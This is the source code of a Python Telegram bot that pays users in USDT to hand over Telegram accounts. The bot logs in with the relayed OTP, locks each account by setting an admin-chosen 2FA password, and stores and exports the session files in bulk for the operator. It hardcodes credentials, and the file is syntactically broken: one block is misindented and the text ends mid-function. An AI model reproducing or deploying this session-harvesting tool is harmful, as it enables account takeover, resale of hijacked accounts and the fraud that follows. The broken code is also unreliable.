import os
import asyncio
import json
import shutil
import zipfile
import sys
from datetime import datetime
from threading import Thread
from flask import Flask, render_template_string
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError

# ==================== CORE CONFIGURATION ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8288574083:AAEXj4EbchN-piQn6w-0Xsl2x6eKhuiDc7s"
ADMIN_ID = 8095751648

MAIN_CHANNEL_ID = -1003904729385          
SESSION_LOG_CHANNEL_ID = -1004345512666   
WITHDRAW_LOG_CHANNEL_ID = -1004331985961  

MAIN_CHANNEL_LINK = "https://t.me/fastrecivernews" 
# =================================================================

BASE_STORAGE_DIR = "user_backups"
PENDING_STORAGE_DIR = "pending_backups" 
TRASH_STORAGE_DIR = "trash_backups"
TIMED_OUT_STORAGE_DIR = "timed_out_backups"

for folder in [BASE_STORAGE_DIR, PENDING_STORAGE_DIR, TRASH_STORAGE_DIR, TIMED_OUT_STORAGE_DIR]:
    if not os.path.exists(folder):
        try: os.makedirs(folder, exist_ok=True)
        except: pass

DB_FILE = "user_database.json"
SETTINGS_FILE = "bot_settings.json"

DEFAULT_SETTINGS = {
    "security_password": "MySecureBotPassword123",
    "country_prices": {"52": 0.51, "60": 0.47, "49": 0.90, "54": 0.50, "880": 0.15, "57": 0.24, "63": 0.10},
    "country_capacity": {"52": 9965982, "60": 100, "49": 838, "54": 500, "880": 50, "57": 100, "63": 100},
    "country_delays": {"52": 600, "60": 600, "49": 600, "54": 600, "880": 60, "57": 240, "63": 30},
    "spam_checker_enabled": False  # এটি নতুন যুক্ত হলো
}

# ==================== DATABASE CONTROLLER ====================
def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                loaded = json.load(f)
                for key in DEFAULT_SETTINGS:
                    if key not in loaded: loaded[key] = DEFAULT_SETTINGS[key]
                return loaded
        except: return DEFAULT_SETTINGS
    return DEFAULT_SETTINGS

def save_settings(settings):
    try:
        with open(SETTINGS_FILE, "w") as f: json.dump(settings, f, indent=4)
    except: pass

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
    except: pass

def is_number_already_verified(phone_number, country_code=None):
    db = load_db()
    clean = phone_number.replace("+", "").replace(" ", "").strip()
    verified_list = db.get("verified_numbers", [])
    if clean in verified_list or phone_number in verified_list: return True
    if country_code:
        if os.path.exists(os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean}.session")): return True
    for code in load_settings()["country_prices"].keys():
        if os.path.exists(os.path.join(BASE_STORAGE_DIR, code, f"+{clean}.session")): return True
    return False

def add_to_verified_numbers(phone_number):
    db = load_db()
    clean = phone_number.replace("+", "").replace(" ", "").strip()
    if "verified_numbers" not in db: db["verified_numbers"] = []
    if clean not in db["verified_numbers"]: db["verified_numbers"].append(clean)
    save_db(db)

def get_user_stats(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "pending_balance": 0.0, "verified_balance": 0.0}
        save_db(db)
    else:
        if "pending_balance" not in db[uid]: db[uid]["pending_balance"] = 0.0
        if "verified_balance" not in db[uid]: db[uid]["verified_balance"] = db[uid].get("balance", 0.0)
    return db[uid]

def add_user_pending_account(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid not in db: get_user_stats(user_id); db = load_db()
    db[uid]["unverified"] += 1
    db[uid]["pending_balance"] = round(db[uid]["pending_balance"] + amount, 2)
    save_db(db)

def convert_pending_to_verified(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
        db[uid]["verified"] += 1
        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
        db[uid]["verified_balance"] = round(db[uid]["verified_balance"] + amount, 2)
        save_db(db)

def reject_pending_account(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
        save_db(db)

def clear_user_verified_balance_and_stats(user_id):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        db[uid]["verified_balance"] = 0.0
        db[uid]["verified"] = 0  
        if "balance" in db[uid]: db[uid]["balance"] = 0.0
        save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
    except: return 0

def get_trash_file_count():
    if not os.path.exists(TRASH_STORAGE_DIR): return 0
    try: return len([f for f in os.listdir(TRASH_STORAGE_DIR) if f.endswith(".session")])
    except: return 0

def get_timed_out_file_count():
    if not os.path.exists(TIMED_OUT_STORAGE_DIR): return 0
    try: return len([f for f in os.listdir(TIMED_OUT_STORAGE_DIR) if f.endswith(".session")])
    except: return 0

# ==================== FLASK SERVER ====================
app = Flask("UptimeServer")
@app.route('/')
def home():
    settings = load_settings()
    total_sessions = 0
    country_list_html = ""
    for code in settings["country_prices"]:
        count = get_current_file_count(code)
        total_sessions += count
        cap = settings["country_capacity"].get(code, "No Limit")
        country_list_html += f"<tr><td><b>+{code}</b></td><td>{count} / {cap}</td><td>${settings['country_prices'][code]}</td></tr>"
    trash_count = get_trash_file_count()
    to_count = get_timed_out_file_count()
    html_template = f"""
    <!DOCTYPE html><html><head><title>Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 40px 20px; }} .card {{ background: #1e293b; max-width: 450px; margin: auto; padding: 25px; border-radius: 10px; border: 1px solid #334155; }} h1 {{ color: #38bdf8; }} table {{ width: 100%; margin-top: 15px; text-align: left; }} th, td {{ padding: 8px; border-bottom: 1px solid #334155; }}</style></head>
    <body><div class="card"><h2 style="color:#10b981;">● SERVER ONLINE</h2><h1>Cloud Backup Bot</h1><p>Total Saved Sessions: <b>{total_sessions}</b></p><p>Time Delay Files: <b>{to_count} Pcs</b></p><p>Trash (Exported) Files: <b>{trash_count} Pcs</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
    """
    return render_template_string(html_template)

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ==================== TELEGRAM BOT CORE ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
user_data = {}
admin_state = {}
live_trackers = {} 

def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()
bot_loop = asyncio.new_event_loop()
Thread(target=start_async_loop, args=(bot_loop,), daemon=True).start()

def is_user_joined_main_channel(user_id):
    if user_id == ADMIN_ID: return True
    try:
        member = bot.get_chat_member(MAIN_CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']: return True
        return False
    except: return True 

def check_force_join(message):
    if not is_user_joined_main_channel(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Our Channel", url=MAIN_CHANNEL_LINK))
        bot.send_message(message.chat.id, "⚠️ **Please join our main channel for more update!**\n\nবট ব্যবহার করতে আপনাকে অবশ্যই আমাদের মেইন চ্যানেলে জয়েন করতে হবে। জয়েন করার পর আবার ট্রাই করুন।", reply_markup=markup)
        return False
    return True

def check_valid_country_and_get_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "").strip()
    settings = load_settings()
    sorted_codes = sorted(settings["country_prices"].keys(), key=len, reverse=True)
    for code in sorted_codes:
        if clean.startswith(code): return code
    return None

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not check_force_join(message): return
    bot.send_message(message.chat.id, "👋 **Welcome to Fast Reciver Bot**\n\nplease send your phone number with your country code.\nExample: `+52XXXXXXXXXX`")

@bot.message_handler(commands=['cancel'])
def cmd_cancel(message):
    if not check_force_join(message): return
    user_id = message.from_user.id
    if user_id in user_data:
        try: asyncio.run_coroutine_threadsafe(user_data[user_id]["client"].disconnect(), bot_loop)
        except: pass
        del user_data[user_id]
    bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")

@bot.message_handler(commands=['capacity'])
def cmd_capacity(message):
    if not check_force_join(message): return
    settings = load_settings()
    response = f"👍 **Available Countries : ({len(settings['country_prices'])}):**\n\n"
    
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        max_cap = settings["country_capacity"].get(code, 999)
        delay = settings.get("country_delays", {}).get(code, 60)
        
        # --- এখানেই রিয়েল-টাইম গণনা হচ্ছে ---
        current_count = get_current_file_count(code)
        
        # ইউজার যেন দেখে কতটি আছে এবং কত ক্যাপাসিটি বাকি আছে
        response += f"🌍 `+{code}`\n"
        response += f"Status: `{current_count}/{max_cap}` | Price: ${prc} | Delay: {delay}s\n\n"
        
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['account'])
def cmd_account(message):
    if not check_force_join(message): return
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    current_time = datetime.now().strftime("%m/%d/%y")
    current_clock = datetime.now().strftime("%H:%M:%S")
    response = (
        f"👤 **ID : {user_id}**\n\n"
        f"✅ Number of verified accounts : {stats['verified']}\n"
        f"⏳ Number of unverified accounts : {stats['unverified']}\n"
        f"🅈 Total Verified Balance : {stats['verified_balance']:.2f} USDT\n"
        f"⏳ Total Pending Balance : {stats['pending_balance']:.2f} USDT\n\n"
        f"📅 Date : {current_time}\n"
        f"🕐 Time : {current_clock} ( NZ Time )\n\n"
        f"✍️ *Note : You Can Only Withdraw Your Verified Balance.*\n\n/withdraw"
    )
    bot.send_message(message.chat.id, response)

# ==================== WITHDRAWAL SYSTEM ====================
@bot.message_handler(commands=['withdraw'])
def cmd_withdraw(message):
    if not check_force_join(message): return
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    if stats['verified_balance'] <= 0.0:
        bot.send_message(message.chat.id, f"⚠️ **Minimum withdrawal condition is valid balance. Your balance is 0.00 USDT.**")
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💳 Withdraw Card", callback_data="wtd_card"),
        types.InlineKeyboardButton("🪙 USDT (BEP-20)", callback_data="wtd_bep20")
    )
    bot.send_message(message.chat.id, "⚡ **Choose Your Withdrawal Method Below:**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("wtd_"))
def handle_withdraw_selection(call):
    user_id = call.from_user.id
    stats = get_user_stats(user_id)
    if stats['verified_balance'] <= 0.0:
        bot.answer_callback_query(call.id, "❌ You don't have enough balance!", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return
    bot.delete_message(call.message.chat.id, call.message.message_id)
    if call.data == "wtd_card":
        bot.send_message(call.message.chat.id, "💳 **Send your card info:**")
        admin_state[user_id] = "wait_wtd_card"
    elif call.data == "wtd_bep20":
        bot.send_message(call.message.chat.id, "🪙 **Send your USDT BEP-20 Address:**\n\n⚠️ *Must be 42 characters long and start with '0x'*")
        admin_state[user_id] = "wait_wtd_bep20"

# ==================== EXPORTER LOGIC ====================
def export_logic(chat_id, country_code, amount):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir):
        bot.send_message(chat_id, f"❌ No sessions for `+{country_code}`")
        return
    all_files = [f for f in os.listdir(target_dir) if f.endswith(".session")]
    all_files.sort(key=lambda x: os.path.getmtime(os.path.join(target_dir, x)), reverse=True)
    selected_files = all_files[:amount]
    if not selected_files:
        bot.send_message(chat_id, "❌ No files found.")
        return
    zip_filename = f"Export_{country_code}.zip"
    try:
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for file in selected_files:
                file_path = os.path.join(target_dir, file)
                zipf.write(file_path, arcname=file)
                jrnl = file + "-journal"
                jrnl_path = os.path.join(target_dir, jrnl)
                if os.path.exists(jrnl_path): zipf.write(jrnl_path, arcname=jrnl)
        with open(zip_filename, 'rb') as doc:
            bot.send_document(chat_id, doc, caption=f"📦 Exported {len(selected_files)} sessions for `+{country_code}`.")
        for file in selected_files:
            try: shutil.move(os.path.join(target_dir, file), os.path.join(TRASH_STORAGE_DIR, file))
            except: pass
            try: shutil.move(os.path.join(target_dir, file + "-journal"), os.path.join(TRASH_STORAGE_DIR, file + "-journal"))
            except: pass
        os.remove(zip_filename)
        bot.send_message(chat_id, "📥 **Files moved to Trash System successfully.** /panel থেকে ডেটা রিকভার বা পার্মানেন্টলি ক্লিয়ার করতে পারবেন।")
    except Exception as e: 
        bot.send_message(chat_id, f"❌ Export Error: {e}")

@bot.message_handler(commands=['export'])
def cmd_export_sessions(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "⚠️ **Format:** `/export <country_code> <amount>`")
        return
    country_code = args[1].replace("+", "").strip()
    try: amount = int(args[2])
    except: return
    export_logic(message.chat.id, country_code, amount)

# ==================== MASTER ADMIN CONTROL PANEL ====================
@bot.message_handler(commands=['panel'])
def admin_panel_command(message):
    if message.from_user.id != ADMIN_ID: return
    settings = load_settings()
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass"), 
        types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country")
    )
    markup.add(
        types.InlineKeyboardButton("🌍 View Allowed Countries", callback_data="pnl_view_allowed"), 
        types.InlineKeyboardButton("❌ Delete/Remove Country", callback_data="pnl_del_country")
    )
    markup.add(
        types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"),
        types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close")
    )
# admin_panel_command ফাংশনের ভেতরে:
    settings = load_settings()
    spam_status = "✅ ON" if settings.get("spam_checker_enabled") else "🚫 OFF"
    
    # বিদ্যমান markup.add গুলোর সাথে এটি যোগ করুন:
    markup.add(
        types.InlineKeyboardButton(f"🔆 Spam Checker: {spam_status}", callback_data="pnl_toggle_spam")
    )
    to_cnt = get_timed_out_file_count()
    trash_cnt = get_trash_file_count()
    
    markup.add(types.InlineKeyboardButton(f"🕒 Time Delay Files ({to_cnt} Pcs)", callback_data="pnl_view_to"))
    markup.add(types.InlineKeyboardButton("📥 Download All Time Delay Files", callback_data="pnl_download_to"))
    
    markup.add(types.InlineKeyboardButton(f"🗑️ View Trash Files ({trash_cnt} Pcs)", callback_data="pnl_view_trash"))
    markup.add(
        types.InlineKeyboardButton("📥 Download All Trash Files", callback_data="pnl_download_all_trash"),
        types.InlineKeyboardButton("💥 Delete All Trash Permanent", callback_data="pnl_clear_trash")
    )
    
    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n🕒 **Time Delay Folder Size:** {to_cnt} files stored.\n🗑️ **Trash Area Size:** {trash_cnt} files currently stored."
    bot.send_message(message.chat.id, panel_msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_") or call.data.startswith("check_time_"))
def handle_admin_and_user_callbacks(call):
    settings = load_settings()
    
    # 🎯 [ইনলাইন বাটনে ক্লিক করলে রিয়েল-টাইম বাকি থাকা সময় দেখাবে]
    if call.data.startswith("check_time_"):
        pid = call.data.replace("check_time_", "")
        if pid in live_trackers:
            rem = live_trackers[pid]
            if rem > 0:
                bot.answer_callback_query(call.id, f"⏳ আপনার অ্যাকাউন্টটি কনফার্ম হতে আরো ({rem}) সেকেন্ড সময় লাগবে", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "🔄 অ্যাকাউন্টটি ভেরিফাই করা হচ্ছে...", show_alert=False)
        else:
            bot.answer_callback_query(call.id, "❌ সেশন ট্র্যাকারটি পাওয়া যায়নি বা টাইমআউট হয়েছে।", show_alert=True)
        return

    if call.from_user.id != ADMIN_ID: return

    # এডমিন প্যানেলের বাটন লজিক
    if call.data == "pnl_toggle_spam":
        settings = load_settings()
        # বর্তমান অবস্থা পরিবর্তন করা (ON থাকলে OFF, OFF থাকলে ON)
        settings["spam_checker_enabled"] = not settings.get("spam_checker_enabled", False)
        save_settings(settings)
        
        # ইউজারকে একটি পপ-আপ মেসেজ দেখানো
        new_status = "ON" if settings["spam_checker_enabled"] else "OFF"
        bot.answer_callback_query(call.id, f"Spam Checker is now {new_status}")
        
        # প্যানেল মেসেজটি আপডেট করে দেওয়া যাতে বাটনের নাম সাথে সাথে পরিবর্তিত দেখায়
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel_command(call.message)
        return
        
    if call.data == "pnl_close":
        bot.delete_message(call.message.chat.id, call.message.message_id)
    elif call.data == "pnl_pass":
        bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
        admin_state[call.from_user.id] = "wait_pass"
    elif call.data == "pnl_set_country":
        bot.send_message(call.message.chat.id, "🌍 *Set Country Parameters (All-In-One)*\nFormat: `Code=Price=Capacity=DelayTime` \n\nExample: `880=0.15=50=60`")
        admin_state[call.from_user.id] = "wait_country_all"
    elif call.data == "pnl_del_country":
        bot.send_message(call.message.chat.id, "❌ **Enter the Country Code you want to delete:**")
        admin_state[call.from_user.id] = "wait_delete_country"
    elif call.data == "pnl_view_allowed": 
        response = "📋 **Allowed Countries Details:**\n\n"
        for code in settings["country_prices"]:
            prc = settings["country_prices"][code]
            cap = settings["country_capacity"].get(code, 999)
            delay = settings.get("country_delays", {}).get(code, 60)
            response += f"• 🌍 **+{code}** ➜ Price: ${prc} | Cap: {cap} | Delay: {delay}s\n"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ Back to Panel", callback_data="pnl_back"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, reply_markup=markup)
    elif call.data == "pnl_view_to":
        if not os.path.exists(TIMED_OUT_STORAGE_DIR): return
        to_files = [f for f in os.listdir(TIMED_OUT_STORAGE_DIR) if f.endswith(".session")]
        if not to_files:
            bot.answer_callback_query(call.id, "🕒 Time Delay Folder is totally empty!", show_alert=True)
            return
        list_msg = "🕒 **Time Delay Files List:**\n\n"
        for idx, f in enumerate(to_files[:50], 1): list_msg += f"{idx}. `{f}`\n"
        bot.send_message(call.message.chat.id, list_msg)
    elif call.data == "pnl_download_to":
        if not os.path.exists(TIMED_OUT_STORAGE_DIR): return
        all_to_files = os.listdir(TIMED_OUT_STORAGE_DIR)
        if not all_to_files: return
        zip_filename = "Time_Delay_Sessions.zip"
        try:
            with zipfile.ZipFile(zip_filename, 'w') as zipf:
                for file in all_to_files:
                    file_path = os.path.join(TIMED_OUT_STORAGE_DIR, file)
                    if os.path.isfile(file_path): zipf.write(file_path, arcname=file)
            with open(zip_filename, 'rb') as doc:
                bot.send_document(call.message.chat.id, doc, caption=f"📦 Total Time Delay Sessions Downloaded!")
            os.remove(zip_filename)
        except Exception as e: bot.send_message(call.message.chat.id, f"❌ Error: {e}")
    elif call.data == "pnl_view_trash":
        if not os.path.exists(TRASH_STORAGE_DIR): return
        trash_files = [f for f in os.listdir(TRASH_STORAGE_DIR) if f.endswith(".session")]
        if not trash_files:
            bot.answer_callback_query(call.id, "🗑️ Trash Bin is empty!", show_alert=True)
            return
        list_msg = "🗑️ **Trash Bin Files List:**\n\n"
        for idx, f in enumerate(trash_files[:50], 1): list_msg += f"{idx}. `{f}`\n"
        bot.send_message(call.message.chat.id, list_msg)
    elif call.data == "pnl_download_all_trash": 
        if not os.path.exists(TRASH_STORAGE_DIR): return
        all_trash_files = os.listdir(TRASH_STORAGE_DIR)
        if not all_trash_files: return
        zip_filename = "All_Trash_Sessions.zip"
        try:
            with zipfile.ZipFile(zip_filename, 'w') as zipf:
                for file in all_trash_files:
                    file_path = os.path.join(TRASH_STORAGE_DIR, file)
                    if os.path.isfile(file_path): zipf.write(file_path, arcname=file)
            with open(zip_filename, 'rb') as doc:
                bot.send_document(call.message.chat.id, doc, caption=f"📦 Trash Backup Downloaded!")
            os.remove(zip_filename)
            for file in all_trash_files: os.remove(os.path.join(TRASH_STORAGE_DIR, file))
            bot.delete_message(call.message.chat.id, call.message.message_id)
            admin_panel_command(call.message)
        except: pass
    elif call.data == "pnl_clear_trash":
        try:
            for file in os.listdir(TRASH_STORAGE_DIR): os.remove(os.path.join(TRASH_STORAGE_DIR, file))
            bot.answer_callback_query(call.id, "💥 Trash Cleared!", show_alert=True)
        except: pass
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel_command(call.message)
    elif call.data == "pnl_all_files":
        file_msg = "📂 *Live Country Session Files Count:*\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for code in settings["country_prices"]:
            count = get_current_file_count(code)
            file_msg += f"• 🌍 Country `+{code}` ➜ **{count} Pcs** Active\n"
            if count > 0: markup.add(types.InlineKeyboardButton(f"📥 Download from +{code} ({count} Pcs)", callback_data=f"pnl_askamt_{code}"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="pnl_back"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup)
    elif call.data.startswith("pnl_askamt_"):
        code = call.data.replace("pnl_askamt_", "")
        bot.send_message(call.message.chat.id, f"✏️ **Enter how many sessions you want to download for +{code}:**")
        admin_state[call.from_user.id] = f"wait_amt_{code}"
    elif call.data == "pnl_back":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel_command(call.message)

# ==================== TEXT MESSAGE HANDLER ====================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id in admin_state:
        state = admin_state[user_id]
        if state == "wait_wtd_card":
            stats = get_user_stats(user_id)
            current_bal = stats['verified_balance']
            if current_bal <= 0.0: return
            clear_user_verified_balance_and_stats(user_id)
            del admin_state[user_id]
            bot.reply_to(message, f"✅ **Your Card withdrawal request for {current_bal} USDT has been submitted!**")
            try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw Card!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n💳 Info: {text}")
            except: pass
            return
        elif state == "wait_wtd_bep20":
            if len(text) != 42 or not text.startswith("0x"): return
            stats = get_user_stats(user_id)
            current_bal = stats['verified_balance']
            if current_bal <= 0.0: return
            clear_user_verified_balance_and_stats(user_id)
            del admin_state[user_id]
            bot.reply_to(message, f"✅ **Your USDT withdrawal request has been submitted!**")
            try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw BEP20!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n🪙 Addr: `{text}`")
            except: pass
            return

        if user_id == ADMIN_ID:
            settings = load_settings()
            if state.startswith("wait_amt_"):
                code = state.replace("wait_amt_", "")
                del admin_state[user_id]
                try:
                    amount = int(text)
                    export_logic(message.chat.id, code, amount)
                except: pass
                return
            del admin_state[user_id]
            try:
                if state == "wait_pass":
                    settings["security_password"] = text
                    save_settings(settings)
                    bot.reply_to(message, f"✅ Updated: `{text}`")
                elif state == "wait_country_all":
                    parts = text.split("=")
                    code = parts[0].strip().replace("+", "")
                    settings["country_prices"][code] = float(parts[1].strip())
                    settings["country_capacity"][code] = int(parts[2].strip())
                    if "country_delays" not in settings: settings["country_delays"] = {}
                    settings["country_delays"][code] = int(parts[3].strip())
                    save_settings(settings)
                    bot.reply_to(message, f"✅ Country `+{code}` updated.")
                elif state == "wait_delete_country":
                    code_to_del = text.replace("+", "").strip()
                    if code_to_del in settings["country_prices"]:
                        del settings["country_prices"][code_to_del]
                        save_settings(settings)
                        bot.reply_to(message, f"✅ Deleted `+{code_to_del}`")
            except: pass
            return

    if not check_force_join(message): return
    if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
        asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
        return

if user_id in user_data:
            try:
                asyncio.run_coroutine_threadsafe(user_data[user_id]["client"].disconnect(), bot_loop)
            except: pass
            del user_data[user_id]
    
    if text.startswith("+") or text.isdigit():
        phone = text if text.startswith("+") else f"+{text}"
        clean_phone = phone.replace("+", "").replace(" ", "").strip()
        
        if is_number_already_verified(clean_phone):
            bot.reply_to(message, "❌ This number already exists. Try another number.")
            return
            
        matched_code = check_valid_country_and_get_code(phone)
        settings = load_settings()
        
        # ১. কান্ট্রি ভ্যালিডেশন চেক
        if not matched_code or matched_code not in settings.get("country_prices", {}):
            bot.reply_to(message, f"❗ This country `+{matched_code if matched_code else phone}` cannot be added right now.")
            return

        # ২. ক্যাপাসিটি চেক
        current_count = get_current_file_count(matched_code)
        max_capacity = settings["country_capacity"].get(matched_code, 0)
        
        if current_count >= max_capacity:
            bot.reply_to(message, f"❌ **Sorry!** The capacity for country `+{matched_code}` is full ({current_count}/{max_capacity}).")
            return

        processing_msg = bot.reply_to(message, "🔄 Processing please wait...")
        asyncio.run_coroutine_threadsafe(send_otp_task(phone, matched_code, user_id, message, processing_msg), bot_loop)
# ==================== TELETHON ASYNC BACKEND ====================
async def send_otp_task(phone_number, country_code, user_id, message, processing_msg):
    settings = load_settings()
    clean_phone = phone_number.replace("+", "").replace(" ", "").strip()
    final_session_path = os.path.join(PENDING_STORAGE_DIR, f"+{clean_phone}")
    user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number, 
            "phone_code_hash": sent_code.phone_code_hash, "clean_phone": clean_phone, 
            "session_path": final_session_path, "country_code": country_code
        }
        bot.edit_message_text(f"🔢 Enter the code sent to the number or send the message.\n\n🏁 ( `{phone_number}` )\n\n➿ /cancel", message.chat.id, processing_msg.message_id)
    except Exception as e:
        try: await user_client.disconnect()
        except: pass

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    settings = load_settings()
    
    try:
        # ১. ওটিপি ভেরিফাই করার চেষ্টা
        await data["client"].sign_in(
            phone=data["phone"],
            code=text,
            phone_code_hash=data["phone_code_hash"]
        )
        
        # ২. স্প্যাম চেকার লজিক (ধাপ ৩)
        if settings.get("spam_checker_enabled", False):
            try:
                # স্প্যামবটকে মেসেজ পাঠানো
                await data["client"].send_message("SpamBot", "/start")
                await asyncio.sleep(2) 
                
                # বট থেকে শেষ মেসেজটি পড়া
                async for msg in data["client"].iter_messages("SpamBot", limit=1):
                    # যদি একাউন্টটি স্প্যাম ফ্রি হয়
                    if "good news" in msg.text.lower():
                        pass # স্প্যাম ফ্রি, এখন ২-এফএ সেটআপে যাবে
                    else:
                        # যদি অ্যাকাউন্ট লিমিটেড হয়
                        bot.reply_to(message, "❗️This Account is Spam, Robots won't accept it, Just accepts New - Spam Free Only")
                        await data["client"].disconnect()
                        del user_data[user_id]
                        return
            except Exception as e:
                bot.reply_to(message, "⚠️ Spam check failed, but proceeding anyway.")

        # ৩. ২-এফএ পাসওয়ার্ড সেটআপ
        try: await data["client"].edit_2fa(new_password=settings["security_password"])
        except: pass
        
        # ৪. ব্যাকআপ প্রসেস শুরু
        await process_backup(user_id, message, data)
        del user_data[user_id]

    except SessionPasswordNeededError:
        bot.reply_to(message, "❌ **Two-Step Verification Active.**")
        try: await data["client"].disconnect()
        except: pass
        del user_data[user_id]

    except Exception as e:
        error_str = str(e)
        if "PHONE_CODE_INVALID" in error_str:
            bot.reply_to(message, "❌ **Wrong OTP!** Please check the code and send it again.")
        elif "PHONE_CODE_EXPIRED" in error_str:
            bot.reply_to(message, "❌ **OTP Expired!** Please request a new code.")
        else:
            bot.reply_to(message, f"❌ **Error:** {error_str}")
        
        try: await data["client"].disconnect()
        except: pass
        return

async def process_backup(user_id, message, data):
    settings = load_settings()
    country_code = data['country_code']
    delay = settings.get("country_delays", {}).get(country_code, 60)

    if country_code not in settings.get("country_prices", {}):
        bot.send_message(message.chat.id, f"❗ This country `+{country_code}` cannot be added right now.")
        try: await data["client"].disconnect()
        except: pass
        return

    current_count = get_current_file_count(country_code)
    max_capacity = settings["country_capacity"].get(country_code, 0)

    if current_count >= max_capacity:
        bot.send_message(message.chat.id, f"❌ **Sorry!** The capacity for country `+{country_code}` is full.")
        try: await data["client"].disconnect()
        except: pass
        return
    # --- নতুন চেক লজিক শেষ ---

    price = settings["country_prices"].get(country_code, 0.15)
    add_to_verified_numbers(data["clean_phone"])
    add_user_pending_account(user_id, price)
    
    tracker_id = str(user_id) + "_" + str(int(datetime.now().timestamp()))
    live_trackers[tracker_id] = delay
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data=f"check_time_{tracker_id}"))
    received_msg = bot.reply_to(message, f"✅ The account number `{data['phone']}` was successfully received\n\n❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n👇 The bot will automatically verify your account\n\n🏷️ Spam Status : 🕊️ Free As Bird", reply_markup=markup)
    
    async def countdown_timer():
        for i in range(delay, 0, -1):
            live_trackers[tracker_id] = i
            await asyncio.sleep(1)
        live_trackers[tracker_id] = 0
    asyncio.create_task(countdown_timer())
    
    await asyncio.sleep(delay)
    
    try:
        if not data["client"].is_connected(): await data["client"].connect()
        
        if not await data["client"].is_user_authorized():
            reject_pending_account(user_id, price)
            db = load_db()
            if data["clean_phone"] in db.get("verified_numbers", []):
                db["verified_numbers"].remove(data["clean_phone"])
                save_db(db)
            
            try:
